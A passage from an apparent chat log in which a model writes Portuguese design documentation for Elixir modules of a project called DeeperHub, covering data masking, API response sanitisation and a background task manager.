*   **Descrição:** Função de conveniência que aplica `mask_sensitive_data/2` se `data` for string, ou `mask_sensitive_map/3` se for mapa. Usa uma lista padrão de `sensitive_keys` configurada para mapas.
*   **`opts`:** Pode encaminhar opções para as funções subjacentes.
    *   `:default_sensitive_keys_for_log` (list): Sobrescreve a lista padrão de chaves para mascarar em logs.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :data_masking, :enabled]`** (Boolean): Habilita/desabilita o mascaramento. (Padrão: `true`)
*   **`[:security, :data_masking, :default_mask_char]`** (String): Caractere padrão para mascaramento. (Padrão: `\"*\"`)
*   **`[:security, :data_masking, :default_redacted_placeholder]`** (String): Placeholder para campos de mapa totalmente redigidos. (Padrão: `\"[REDACTED]\"`)
*   **`[:security, :data_masking, :log_masking_sensitive_keys]`** (List de Strings/Atoms): Lista padrão de chaves a serem mascaradas por `mask_for_log/2` quando o input é um mapa.
    *   Ex: `[\"password\", \"token\", \"secret\", \"credit_card_number\", \"cvv\", \"api_key\"]`
*   **Padrões específicos por tipo:**
    *   `[:security, :data_masking, :email, :visible_prefix_chars]` (Integer)
    *   `[:security, :data_masking, :cpf, :visible_digits_end]` (Integer)
    *   `[:security, :data_masking, :credit_card, :visible_last_digits]` (Integer)
    *   ... e assim por diante para outros tipos.
*   **`[:security, :data_masking, :auto_detect_patterns]`** (List de Maps): Configuração para `mask_sensitive_data/2`.
    *   Ex: `[%{type: :email, regex: ~r/.../, mask_function: &MyMaskers.email/1}, ...]`

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Para obter configurações de mascaramento.
*   `DeeperHub.Core.Logger`: Para logar se o mascaramento falhar ou se uma tentativa de logar dados não mascarados for detectada (se houver tal verificação).

### 8.2. Bibliotecas Externas

*   Nenhuma específica é estritamente necessária, mas bibliotecas de manipulação de string ou regex podem ser usadas internamente.

## 🤝 9. Como Usar / Integração

*   **Em Módulos de Logging (`DeeperHub.Security.LogSanitizer`):**
    *   O `LogSanitizer` chamaria `DataMasking.mask_for_log(metadata_map)` antes de passar os metadados para os backends de log.
*   **Em Módulos de API (`DeeperHub.Security.ResponseSanitizer`):**
    *   O `ResponseSanitizer` chamaria `DataMasking.mask_sensitive_map(api_response_body, configured_sensitive_keys_for_api)` antes de serializar para JSON.
*   **Em Interfaces de Usuário (ex: painel de admin mostrando dados de usuário):**
    *   O controller ou view helper chamaria as funções de mascaramento específicas antes de renderizar os dados.
    ```elixir
    # Em um controller/view
    def show_user_details(user) do
      masked_email = DeeperHub.Security.DataMasking.mask_email(user.email) |> elem(1)
      masked_cpf = DeeperHub.Security.DataMasking.mask_cpf(user.cpf) |> elem(1)
      # ... renderizar com dados mascarados
    end
    ```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar cada função de mascaramento específica (`mask_email`, `mask_cpf`, etc.) com vários formatos de entrada válidos e inválidos.
*   Testar `mask_sensitive_data` com strings contendo múltiplos tipos de dados sensíveis.
*   Testar `mask_sensitive_map` com mapas simples e aninhados, e diferentes `sensitive_keys`.
*   Testar o comportamento com diferentes configurações (ex: caracteres de mascaramento, número de dígitos visíveis).
*   Localização: `test/deeper_hub/security/data_masking/`.

### 10.2. Métricas

*   `deeper_hub.security.data_masking.fields_masked.count` (tags: `data_type` (`email`, `cpf`, `map_key`), `context` (`log`, `api_response`, `ui`))
*   `deeper_hub.security.data_masking.auto_detected_masked.count` (tags: `data_type`)

### 10.3. Logs

*   **Nível DEBUG:** Informações sobre quais campos foram mascarados em uma determinada chamada (útil durante o desenvolvimento e ajuste de regras).
*   **Nível WARNING:** Se uma função de mascaramento receber um tipo de dado inesperado ou se um padrão de regex configurado falhar ao compilar.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :data_masking, :data_masked]`
    *   Metadados: `%{data_type: type, characters_original: len, characters_masked: len, context: context_string}`

## ❌ 11. Tratamento de Erros

*   As funções de mascaramento devem ser robustas e não falhar se a entrada não corresponder exatamente ao formato esperado (ex: um CPF mal formatado). Nesses casos, elas podem optar por retornar a string original (com um log de aviso) ou aplicar um mascaramento mais genérico/completo.
*   Falhas em obter configurações (ex: padrões de regex) devem levar a um comportamento de mascaramento padrão seguro (ex: redigir completamente o campo).

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Eficácia do Mascaramento:** Garantir que os padrões de mascaramento realmente ocultem a informação sensível e não permitam inferência fácil dos dados originais.
*   **Não Mascarar Excessivamente:** Evitar mascarar tanta informação que os dados se tornem inúteis para o propósito pretendido (ex: depuração, identificação parcial).
*   **Performance:** Regexes complexas ou mascaramento recursivo em estruturas de dados muito grandes podem impactar a performance. Otimizar e testar o desempenho.

## 🧑‍💻 13. Contribuição

*   Ao adicionar suporte para mascarar novos tipos de dados, crie uma função específica e adicione-a aos mecanismos de detecção automática, se aplicável.
*   Mantenha os padrões de regex e as regras de mascaramento atualizados e bem testados.
*   Considere a internacionalização se estiver mascarando dados que variam significativamente por localidade (ex: formatos de telefone, números de identificação nacionais).

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar mascaramento diferencial: diferentes níveis de mascaramento para o mesmo dado dependendo do papel do usuário que o visualiza.
*   [ ] Adicionar suporte para \"tokenização\" ou \"criptografia format-preserving\" como alternativas mais avançadas ao mascaramento simples para certos casos de uso onde a reversibilidade controlada ou a manutenção do formato original são necessárias.
*   [ ] Permitir que as regras de mascaramento (especialmente para `mask_sensitive_map` e `mask_for_log`) sejam configuradas dinamicamente com mais granularidade através do `SecurityPolicyManager`.
*   [ ] Desenvolver ferramentas para ajudar a identificar automaticamente dados sensíveis no código que deveriam ser mascarados antes de logar/exibir.
*   [ ] Avaliar o uso de bibliotecas especializadas em detecção e mascaramento de PII se as necessidades se tornarem muito complexas.

---

*Última atualização: 2025-05-12*

---

O mascaramento de dados é um aspecto importante da proteção de dados e privacidade!

Para o próximo, podemos abordar `DeeperHub.Security.ResponseSanitizer` que é um consumidor natural do `DataMasking`, ou mudar para um módulo de infraestrutura como `DeeperHub.Core.BackgroundTaskManager`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Vamos continuar com o `DeeperHub.Security.ResponseSanitizer`, que é um consumidor direto das funcionalidades do `DataMasking` e essencial para proteger dados em trânsito para o cliente.

---

# Módulo: `DeeperHub.Security.ResponseSanitizer` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.ResponseSanitizer`

O módulo `DeeperHub.Security.ResponseSanitizer` é responsável por **sanitizar as respostas da API e das páginas web** antes que sejam enviadas aos clientes. Seu principal objetivo é prevenir o vazamento de dados sensíveis ou a inclusão de conteúdo malicioso que poderia ser explorado no lado do cliente (embora o foco principal de XSS seja na entrada, a sanitização de saída é uma defesa adicional).

Este módulo trabalha em conjunto com `DeeperHub.Security.DataMasking` para aplicar regras de mascaramento a dados sensíveis e pode também filtrar ou modificar cabeçalhos HTTP para reforçar a segurança. A ideia é garantir que apenas as informações necessárias e seguras cheguem ao usuário final. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Sanitização do Corpo da Resposta (`sanitize_response/2`):**
    *   Analisar o corpo da resposta (JSON, HTML, etc.) e aplicar regras de sanitização.
    *   Integrar com `DeeperHub.Security.DataMasking` para mascarar campos sensíveis identificados em respostas JSON ou estruturas de dados antes da serialização.
    *   Para respostas HTML (embora menos comum para APIs puras), aplicar sanitização XSS como uma camada de defesa adicional, mesmo que os templates já devam fazer escaping.
*   **Filtragem de Campos Sensíveis (`filter_sensitive_fields/2`):**
    *   Remover ou substituir campos explicitamente marcados como sensíveis e que não deveriam ser expostos em uma determinada resposta de API, mesmo que o usuário tenha permissão para a entidade principal.
*   **Sanitização de Cabeçalhos HTTP (`sanitize_headers/2`):**
    *   Remover ou modificar cabeçalhos HTTP de resposta que possam vazar informações sensíveis sobre o servidor ou a aplicação (ex: `Server`, `X-Powered-By`, versões detalhadas de software).
    *   Garantir que cabeçalhos de segurança (CSP, HSTS, etc., gerenciados por outros módulos como `XssProtection` ou um plug de segurança HTTP) estejam corretamente configurados e não sejam sobrescritos indevidamente.
*   **Configurabilidade de Regras de Sanitização:**
    *   Permitir a definição de quais campos são sensíveis por tipo de resposta ou endpoint.
    *   Configurar o comportamento da sanitização (remover campo, mascarar, substituir por placeholder).
*   **Integração com `Core.APIResponder`:**
    *   Potencialmente, ser chamado pelo `APIResponder` antes de serializar a resposta final para o cliente.
*   **Observabilidade:**
    *   Registrar métricas sobre o número de respostas sanitizadas e os tipos de dados modificados.
    *   Logar quando dados sensíveis são ativamente removidos ou mascarados de uma resposta.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.ResponseSanitizer` (Fachada Pública / Módulo Funcional):**
    *   Ponto de entrada para as funcionalidades de sanitização de respostas.
    *   Contém a lógica para orquestrar a sanitização do corpo e dos cabeçalhos.
    *   **Interações:**
        *   `DeeperHub.Security.DataMasking`: Para aplicar regras de mascaramento a campos específicos.
        *   `DeeperHub.Core.ConfigManager` / `SecurityPolicyManager`: Para obter a lista de campos sensíveis por contexto, cabeçalhos a serem removidos/modificados, e outras políticas de sanitização.
        *   `DeeperHub.Core.Logger` e `Core.Metrics`: Para observabilidade.
2.  **Configurações (via `Core.ConfigManager` / `SecurityPolicyManager`):**
    *   Listas de chaves sensíveis globais e por endpoint/tipo de resposta.
    *   Lista de cabeçalhos HTTP a serem removidos ou com valores fixos.
    *   Padrões de sanitização para diferentes tipos de conteúdo.

### 3.2. Estrutura de Diretórios (Proposta)

Como este módulo tende a ser mais funcional e depende fortemente de configurações, pode ser simples:
```
lib/deeper_hub/security/response_sanitizer.ex  # Contém a fachada e a lógica de serviço
```
Se a lógica se tornar muito complexa com diferentes estratégias de sanitização:
```
lib/deeper_hub/security/response_sanitizer/
├── response_sanitizer.ex             # Fachada Pública
│
└── services/
    └── response_sanitizer_service.ex # Lógica principal
```

### 3.3. Decisões de Design Importantes

*   **Integração Transparente:** Idealmente, a sanitização de respostas deve ser integrada de forma transparente no fluxo de resposta da API (ex: através de um Plug Phoenix ou como parte do `APIResponder`).
*   **Performance:** A sanitização não deve adicionar uma sobrecarga significativa à geração de respostas. Regexes ou iterações em grandes estruturas de dados devem ser eficientes.
*   **Configurabilidade Detalhada:** Administradores devem poder configurar facilmente quais campos são considerados sensíveis para diferentes contextos de API sem alterar o código.
*   **Não Substitui a Lógica de Negócio:** O `ResponseSanitizer` não deve ser usado para implementar lógica de autorização de campo (ou seja, decidir se um usuário *pode ver* um campo). Essa decisão pertence à camada de serviço/controller. O sanitizer apenas garante que, se um campo sensível *estiver* presente, ele seja tratado (mascarado/removido) antes de sair.

## 🛠️ 4. Casos de Uso Principais

*   **API Retorna Detalhes do Usuário:**
    *   Um endpoint `/api/v1/users/me` retorna os dados do usuário.
    *   Antes de enviar, `ResponseSanitizer.sanitize_response(user_data_map, opts)` é chamado.
    *   Se `user_data_map` contiver `%{password_hash: \"...\"}`, este campo é removido ou substituído por `\"[FILTERED]\"`. Campos como CPF ou data de nascimento podem ser mascarados usando `DataMasking`.
*   **API de Administração Exibe Lista de Usuários:**
    *   Um endpoint `/admin/api/users` retorna uma lista de usuários.
    *   Para cada usuário na lista, campos como `last_login_ip` ou `email_secundario_nao_verificado` podem ser removidos ou mascarados se a política para essa API de admin assim definir.
*   **Remoção de Cabeçalhos HTTP Padrão:**
    *   O `ResponseSanitizer` (ou um Plug que o utiliza) remove ou modifica cabeçalhos como `Server: Cowboy` ou `X-Powered-By: Elixir/Phoenix` para evitar fingerprinting do servidor.

## 🌊 5. Fluxos Importantes

### Fluxo de Sanitização de uma Resposta JSON de API (Exemplo com Plug)

1.  **Controller Prepara Dados:** O Controller de API prepara um mapa `response_data` para ser enviado como JSON.
2.  **Plug `ResponseSanitizerPlug` (no final do pipeline, antes da serialização JSON):**
    *   Recebe a `conn` e o `response_data` (talvez armazenado em `conn.assigns.response_body` pelo controller).
    *   Chama `DeeperHub.Security.ResponseSanitizer.sanitize_response(response_data, %{context: conn.request_path, endpoint_config_key: \"api.users.get_details\"})`.
3.  **`ResponseSanitizer.sanitize_response/2`:**
    *   Obtém as regras de sanitização para o `context` ou `endpoint_config_key` do `ConfigManager` (ex: lista de campos sensíveis a serem removidos/mascarados).
    *   Itera sobre o `response_data`.
    *   Para campos marcados como sensíveis e que devem ser mascarados, chama `DeeperHub.Security.DataMasking` (ex: `DataMasking.mask_email(value)`).
    *   Para campos marcados como sensíveis e que devem ser removidos, os remove do mapa.
    *   Chama `DeeperHub.Security.ResponseSanitizer.sanitize_headers(conn.resp_headers, opts)` para limpar cabeçalhos.
4.  **Plug `ResponseSanitizerPlug`:**
    *   Atualiza `conn.assigns.response_body` com os dados sanitizados.
    *   Atualiza `conn.resp_headers` com os cabeçalhos sanitizados.
5.  **Serialização e Envio:** O `APIResponder` (ou o renderizador Phoenix) pega os dados sanitizados e os envia para o cliente.

## 📡 6. API (Funções Públicas da Fachada)

### 6.1. `DeeperHub.Security.ResponseSanitizer.sanitize_response(data :: map() | list() | String.t(), opts :: keyword()) :: {:ok, sanitized_data :: term()} | {:error, term()}`

*   **Descrição:** Sanitiza o corpo de uma resposta. Se for um mapa ou lista, aplica `filter_sensitive_fields` e `DataMasking`. Se for uma string HTML (menos comum para APIs), pode aplicar `XssProtection.sanitize_html`.
*   **`opts`:**
    *   `:content_type` (String.t): Tipo de conteúdo da resposta (ex: `\"application/json\"`, `\"text/html\"`). Influencia a estratégia de sanitização.
    *   `:sensitive_keys` (list(atom() | String.t)): Lista de chaves a serem filtradas/mascaradas se `data` for um mapa/lista. Sobrescreve as configurações globais para esta chamada.
    *   `:masking_options_for_key` (map): `%{key => data_masking_opts}` para aplicar opções de mascaramento específicas por chave.
    *   `:html_sanitize_options` (keyword): Opções para `XssProtection.sanitize_html` se for uma resposta HTML.

### 6.2. `DeeperHub.Security.ResponseSanitizer.filter_sensitive_fields(data :: map() | list(), keys_to_filter :: list(atom() | String.t()), replacement_value :: String.t() | nil) :: map() | list()`

*   **Descrição:** Remove (se `replacement_value` for `nil`) ou substitui os valores das chaves especificadas em `keys_to_filter`.
*   **`replacement_value`:** (Padrão: `\"[FILTERED]\"`)

### 6.3. `DeeperHub.Security.ResponseSanitizer.sanitize_headers(headers :: list({String.t(), String.t()}), opts :: keyword()) :: list({String.t(), String.t()})`

*   **Descrição:** Remove ou modifica cabeçalhos HTTP sensíveis da lista de cabeçalhos de resposta.
*   **`opts`:**
    *   `:headers_to_remove` (list(String.t)): Lista de nomes de cabeçalhos (case-insensitive) a serem completamente removidos.
    *   `:headers_to_overwrite` (map): `%{header_name => new_value}` para sobrescrever valores de cabeçalhos.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :response_sanitizer, :enabled]`** (Boolean): Habilita/desabilita a sanitização de respostas. (Padrão: `true`)
*   **`[:security, :response_sanitizer, :default_sensitive_keys]`** (List de Strings/Atoms): Lista global de chaves que devem ser filtradas/mascaradas em respostas JSON/mapa, a menos que um contexto específico diga o contrário.
    *   Ex: `[\"password_hash\", \"internal_token\", \"user_salt\"]`
*   **`[:security, :response_sanitizer, :default_replacement_value]`** (String): Placeholder padrão para campos filtrados. (Padrão: `\"[FILTERED]\"`)
*   **`[:security, :response_sanitizer, :headers_to_remove_default]`** (List de Strings): Cabeçalhos HTTP que devem ser sempre removidos das respostas.
    *   Ex: `[\"X-Powered-By\", \"Server\", \"X-AspNet-Version\"]`
*   **`[:security, :response_sanitizer, :endpoint_policies, <request_path_pattern>]`** (Map): Políticas específicas por endpoint ou padrão de path.
    *   Ex: `%{ \"/api/v1/users/me\": %{allow_fields: [\"id\", \"email\", \"profile\"], mask_fields: %{cpf: :partial}}, \"/admin/users\": %{remove_fields: [\"password_hash\"]} }`
    *   Isto permite um controle granular sobre o que é exposto em cada API.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Para obter políticas e listas de campos sensíveis.
*   `DeeperHub.Core.Logger`: Para logar ações de sanitização.
*   `DeeperHub.Security.DataMasking`: Para aplicar mascaramento específico a tipos de dados.
*   `DeeperHub.Security.XssProtection`: Se for necessário sanitizar respostas HTML.

### 8.2. Bibliotecas Externas

*   Nenhuma específica, mas pode usar bibliotecas de manipulação de mapas/listas eficientes.

## 🤝 9. Como Usar / Integração

*   **Plug Phoenix:** A forma mais comum de integrar é através de um Plug no final do pipeline de API, antes da resposta ser enviada.
    ```elixir
    # lib/deeper_hub_web/plugs/response_sanitizer_plug.ex
    defmodule DeeperHubWeb.Plugs.ResponseSanitizerPlug do
      import Plug.Conn
      alias DeeperHub.Security.ResponseSanitizer

      def init(opts), do: opts

      def call(conn, _opts) do
        # Registrar um before_send para modificar o corpo e cabeçalhos finais
        register_before_send(conn, fn conn_before_send ->
          # Sanitizar corpo (assumindo que está em conn_before_send.resp_body se já foi setado)
          # Esta parte é mais complexa com Phoenix porque o corpo é setado pelo controller.
          # Uma abordagem pode ser ter o APIResponder chamar o sanitizer.
          # Ou, se o corpo for um assign:
          # if assigned_body = conn_before_send.assigns[:response_data_for_client] do
          #   {:ok, sanitized_body} = ResponseSanitizer.sanitize_response(assigned_body, context: conn_before_send.request_path)
          #   conn_before_send = %{conn_before_send | resp_body: Jason.encode!(sanitized_body)} # Exemplo, a serialização real é feita depois
          # end
          
          # Sanitizar Cabeçalhos
          sanitized_headers = ResponseSanitizer.sanitize_headers(conn_before_send.resp_headers)
          
          # Reconstruir conn com headers sanitizados
          # Esta é uma simplificação; a manipulação de resp_headers precisa ser feita com cuidado.
          Enum.reduce(conn_before_send.resp_headers, conn_before_send, fn {key, _val}, c -> delete_resp_header(c, key) end)
          |> Enum.reduce(sanitized_headers, fn {key, val}, c -> put_resp_header(c, key, val) end)
        end)
      end
    end

    # No APIResponder
    defmodule DeeperHub.Core.APIResponder do
      alias DeeperHub.Security.ResponseSanitizer
      # ...
      def send_success(conn, status, data_map) do
        # Supondo que 'data_map' são os dados ANTES de qualquer mascaramento para o cliente
        endpoint_policy_key = # Derivar da conn.request_path ou rota
        {:ok, sanitized_data} = ResponseSanitizer.sanitize_response(data_map, %{policy_key: endpoint_policy_key})
        
        # ... então formatar 'sanitized_data' na estrutura de resposta padrão e enviar ...
        json(conn |> put_status(status), %{status: \"success\", data: sanitized_data})
      end
    end
    ```
    A integração mais limpa para o corpo da resposta é geralmente dentro do `APIResponder` ou uma função de renderização customizada, antes da serialização final.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar `sanitize_response` com diferentes tipos de dados (mapas, listas, strings) e diferentes configurações de `sensitive_keys` e opções de mascaramento.
*   Testar `sanitize_headers` para garantir que os cabeçalhos corretos são removidos/modificados.
*   Verificar a lógica de fallback para políticas de endpoint vs. globais.
*   Localização: `test/deeper_hub/security/response_sanitizer/`.

### 10.2. Métricas

*   `deeper_hub.security.response_sanitizer.responses_processed.count` (tags: `endpoint_pattern`)
*   `deeper_hub.security.response_sanitizer.fields_filtered.count` (tags: `field_key`, `endpoint_pattern`)
*   `deeper_hub.security.response_sanitizer.fields_masked.count` (tags: `field_key`, `masking_type`)
*   `deeper_hub.security.response_sanitizer.headers_removed.count` (tags: `header_name`)

### 10.3. Logs

*   **Nível DEBUG:** Detalhes sobre quais campos/cabeçalhos foram sanitizados em uma resposta específica (cuidado com o volume de logs).
*   **Nível INFO:** Carregamento de novas políticas de sanitização.
*   **Nível WARNING:** Tentativa de sanitizar um tipo de conteúdo não suportado ou configuração de política de sanitização ausente para um endpoint.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :response_sanitizer, :sanitize_body, :stop]`
    *   Metadados: `%{request_path: path, fields_filtered_count: count, fields_masked_count: count}`
*   `[:deeper_hub, :security, :response_sanitizer, :sanitize_headers, :stop]`
    *   Metadados: `%{request_path: path, headers_removed_count: count}`

## ❌ 11. Tratamento de Erros

*   Se a sanitização de uma resposta falhar (ex: erro ao aplicar uma regra de mascaramento complexa), o sistema deve, idealmente, logar o erro e retornar uma resposta de erro genérica para o cliente, em vez de vazar dados não sanitizados ou quebrar a requisição.
*   Falhas ao carregar políticas de sanitização do `ConfigManager` devem levar ao uso de políticas padrão restritivas.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Definição Correta de \"Sensível\":** A eficácia do `ResponseSanitizer` depende inteiramente da correta identificação e configuração de quais campos e cabeçalhos são sensíveis em diferentes contextos. Esta é uma tarefa contínua.
*   **Não Confiar Apenas na Sanitização de Saída:** A sanitização de saída é uma camada de defesa. A lógica de negócio primária não deve carregar ou processar dados sensíveis desnecessariamente, e a autorização de acesso a campos deve ocorrer antes da fase de sanitização.
*   **Complexidade vs. Performance:** Regras de sanitização muito complexas ou a necessidade de inspecionar profundamente grandes volumes de dados de resposta podem impactar a latência.

## 🧑‍💻 13. Contribuição

*   Ao adicionar novos endpoints de API ou modificar os dados retornados, revise e atualize as políticas de `ResponseSanitizer` no `ConfigManager` para garantir que nenhum novo dado sensível seja exposto acidentalmente.
*   Mantenha a lista de `default_sensitive_keys` e `headers_to_remove_default` atualizada com as melhores práticas.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Permitir políticas de sanitização baseadas no papel do usuário autenticado (ex: admins veem mais dados que usuários regulares).
*   [ ] Integração com um sistema de \"Data Loss Prevention\" (DLP) mais amplo, se aplicável.
*   [ ] Adicionar a capacidade de \"anotar\" campos em schemas Ecto com metadados sobre sua sensibilidade, para que o `ResponseSanitizer` possa usar essas anotações para aplicar regras automaticamente.
*   [ ] Desenvolver ferramentas de teste que verifiquem automaticamente as respostas da API contra uma lista de padrões de dados sensíveis que não deveriam vazar.

---

*Última atualização: 2025-05-12*

---

Com isso, temos uma boa cobertura da sanitização de respostas.

Para o próximo, que tal `DeeperHub.Core.BackgroundTaskManager` para explorarmos a execução de tarefas assíncronas, ou prefere continuar com algum outro módulo de segurança como `HashingService` ou `AtRestEncryptionService` (que já tocamos um pouco)?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos detalhar o `DeeperHub.Core.BackgroundTaskManager`. Este é um componente de infraestrutura vital para executar operações que não precisam bloquear o ciclo de requisição-resposta ou que são de longa duração.

---

# Módulo: `DeeperHub.Core.BackgroundTaskManager` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Core.BackgroundTaskManager`

O módulo `DeeperHub.Core.BackgroundTaskManager` é o sistema centralizado para **gerenciar e executar tarefas em segundo plano (background tasks)** no DeeperHub. Ele permite que a aplicação enfileire trabalhos para execução assíncrona, desacoplando operações demoradas ou não críticas do fluxo principal de interação do usuário.

Isso é crucial para manter a responsividade da aplicação, processar grandes volumes de dados, interagir com serviços externos lentos e agendar tarefas recorrentes. O BackgroundTaskManager abstrai a biblioteca ou o mecanismo de enfileiramento subjacente (ex: Oban, Exq, Broadway, ou um sistema customizado baseado em GenServer/ETS). 😊

*(Nota: A documentação original tem `DeeperHub.BackgroundTasks` com vários submódulos como `BackgroundTasksFacade`, `Adapters.BackgroundTasksAdapter`, `Services.DefaultBackgroundTaskService`, etc. Esta documentação consolida a fachada em `DeeperHub.Core.BackgroundTaskManager` e assume que a lógica de serviço e adaptação pode residir em `DeeperHub.BackgroundTasks.*` como um submódulo do Core ou um contexto de domínio próprio, dependendo da complexidade desejada.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Enfileiramento de Tarefas (`enqueue_task/3` ou `schedule_task/3`):**
    *   Permitir que qualquer módulo da aplicação enfileire uma tarefa para execução assíncrona.
    *   Especificar o módulo e função do \"worker\" a ser executado e seus argumentos.
*   **Agendamento de Tarefas (`schedule_recurring_task/4`):**
    *   Agendar tarefas para execução em um momento específico no futuro.
    *   Agendar tarefas recorrentes (ex: usando sintaxe cron).
*   **Execução de Tarefas:**
    *   Gerenciar um pool de workers para processar tarefas da fila.
    *   Garantir que as tarefas sejam executadas de forma isolada e confiável.
*   **Gerenciamento de Filas (Opcional, dependendo do backend):**
    *   Suporte a múltiplas filas com diferentes prioridades.
*   **Políticas de Retentativa:**
    *   Implementar retentativas automáticas para tarefas que falham, com backoff exponencial configurável.
    *   Definir um número máximo de tentativas.
*   **Tratamento de Falhas e Dead-Letter Queue (DLQ):**
    *   Mover tarefas que falham consistentemente para uma DLQ para análise manual.
*   **Monitoramento e Status de Tarefas (`get_task_status/2`):**
    *   Permitir a consulta do status de tarefas individuais (pendente, em execução, concluída, falha).
    *   Fornecer estatísticas sobre o sistema de tarefas (número de tarefas na fila, workers ativos, taxa de erro, etc.) (`get_statistics/1`).
*   **Cancelamento de Tarefas (`cancel_task/2`, `cancel_recurring_task/2`):**
    *   Permitir o cancelamento de tarefas pendentes ou agendadas.
*   **Abstração de Backend:**
    *   Fornecer uma interface (`BackgroundTasksBehaviour`) para que diferentes backends de enfileiramento (Oban, Exq, etc.) possam ser usados.
*   **Observabilidade:**
    *   Registrar logs detalhados sobre o ciclo de vida das tarefas.
    *   Emitir métricas sobre o desempenho do sistema de tarefas.
*   **Limpeza de Tarefas Antigas (`cleanup_old_tasks/2`):**
    *   Remover registros de tarefas concluídas ou falhas antigas para manter o sistema limpo.
*   **Idempotência (Responsabilidade do Worker):**
    *   Os workers devem ser projetados para serem idempotentes, se possível, para lidar com reprocessamentos.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.BackgroundTaskManager` (Fachada Pública):**
    *   Ponto de entrada para enfileirar, agendar e gerenciar tarefas.
    *   Delega para o `BackgroundTasksAdapter` configurado.
2.  **`DeeperHub.BackgroundTasks.Adapters.BackgroundTasksAdapter` (Behaviour e Implementações):**
    *   **Responsabilidade:** Abstrair a biblioteca de enfileiramento subjacente.
    *   **Comportamento (`BackgroundTasksBehaviour`):** Define a interface.
    *   **Implementações:**
        *   `ObanAdapter`: Para integrar com a biblioteca Oban.
        *   `ExqAdapter`: Para integrar com Exq (baseado em Redis).
        *   `SimpleEtsQueueAdapter` (GenServer/ETS): Uma implementação leve para cenários mais simples ou testes, sem persistência robusta entre reinícios.
        *   `NoOpAdapter`: Não executa tarefas, útil para desabilitar em certos ambientes.
3.  **Workers de Tarefas (Definidos pela Aplicação):**
    *   Módulos Elixir que implementam a lógica de uma tarefa específica. Eles geralmente seguem um comportamento esperado pelo backend de enfileiramento (ex: `Oban.Worker`).
    *   Ex: `DeeperHub.Notifications.Workers.EmailWorker`, `DeeperHub.Audit.Workers.LogProcessingWorker`.
4.  **Backend de Enfileiramento (Externo ou Embutido):**
    *   O sistema real que armazena as filas e gerencia os workers (ex: PostgreSQL para Oban, Redis para Exq, ou ETS para uma solução simples).
5.  **`DeeperHub.BackgroundTasks.Supervisor` (ou `UnifiedSupervisor`):**
    *   Supervisiona os processos do adaptador de tarefas (se for um GenServer) e quaisquer workers de gerenciamento interno (ex: `CleanupWorker`). O backend de enfileiramento (como Oban) geralmente tem seu próprio supervisor.
6.  **`DeeperHub.BackgroundTasks.Integrations.AuditIntegration`, `EventIntegration`, `MetricsIntegration`, `NotificationIntegration`:**
    *   Submódulos para integrar o sistema de tarefas com auditoria, eventos, métricas e notificações.
7.  **Configurações (via `DeeperHub.Core.ConfigManager`):**
    *   Qual adaptador usar, configurações de conexão para o backend (Redis URL, DB Repo), configurações de fila, políticas de retry padrão, etc.

### 3.2. Estrutura de Diretórios (Proposta para `BackgroundTasks` como submódulo do Core ou contexto)

Se for um contexto próprio:
```
lib/deeper_hub/background_tasks/
├── background_task_manager.ex      # Fachada Pública (Core.BackgroundTaskManager)
│
├── adapters/
│   ├── background_tasks_adapter.ex   # Behaviour e Default Adapter (que usa uma implementação)
│   ├── oban_adapter.ex
│   └── simple_ets_queue_adapter.ex
│
├── services/                       # (Se a lógica do adapter for complexa)
│   └── default_background_tasks_service.ex # Exemplo de serviço que usa o adapter
│
├── integrations/
│   ├── audit_integration.ex
│   ├── event_integration.ex
│   ├── metrics_integration.ex
│   └── notification_integration.ex
│
├── schema/                         # Schemas Ecto se o backend (ex: Oban) usar o DB
│   └── oban_jobs_schema.ex         # (Geralmente definido pela biblioteca Oban)
│
├── supervisor.ex
└── telemetry.ex
```
Ou se a fachada `Core.BackgroundTaskManager` delega diretamente para adaptadores em `BackgroundTasks`:
```
lib/deeper_hub/core/
└── background_task_manager.ex      # Fachada Pública

lib/deeper_hub/background_tasks/    # Lógica e adaptadores
├── adapters/
│   ├── background_tasks_adapter.ex   # Behaviour
│   ├── oban_adapter.ex
│   └── ...
├── integrations/
│   └── ...
├── supervisor.ex
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Escolha do Backend:** A escolha da biblioteca de enfileiramento (Oban, Exq, Broadway, etc.) é uma decisão arquitetural chave e depende dos requisitos de persistência, confiabilidade, monitoramento e complexidade. Oban (com PostgreSQL) é uma escolha popular e robusta em Elixir.
*   **Idempotência dos Workers:** Os workers devem ser projetados para serem idempotentes sempre que possível, pois as tarefas podem ser reexecutadas devido a falhas ou reinícios.
*   **Serialização de Argumentos:** Os argumentos das tarefas devem ser serializáveis (termos simples, mapas, listas) para serem armazenados na fila.
*   **Concorrência e Recursos:** Configurar o número de workers e filas para balancear o processamento de tarefas com os recursos disponíveis do sistema.

## 🛠️ 4. Casos de Uso Principais

*   **Envio de Email de Boas-Vindas:**
